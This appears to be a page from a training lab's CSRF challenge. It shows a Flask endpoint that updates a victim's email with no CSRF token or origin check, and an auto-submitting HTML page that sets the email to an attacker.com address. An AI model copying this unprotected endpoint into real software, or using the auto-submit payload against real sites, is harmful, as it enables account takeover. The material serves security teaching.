⚡ CSRF Attack Simulator

In a real attack, the victim visits a malicious page that auto-submits a form to /challenges/csrf/change_email — no user interaction required. Simulate that here:

🔍 Vulnerable Endpoint

@app.route('/challenges/csrf/change_email', methods=['POST']) def csrf_change_email(): # ⚠ No CSRF token, no origin check! new_email = request.form.get('email', '') db.execute("UPDATE csrf_users SET email = ? WHERE username = 'victim'", [new_email]) db.commit() return redirect(...)

📄 Malicious Page PoC

An attacker would host this HTML — when the victim visits it, the form auto-submits:

<html> <body onload="document.forms[0].submit()"> <form action="http://localhost:5000/challenges/csrf/change_email" method="POST"> <input type="hidden" name="email" value="hacked@attacker.com"> </form> </body> </html>
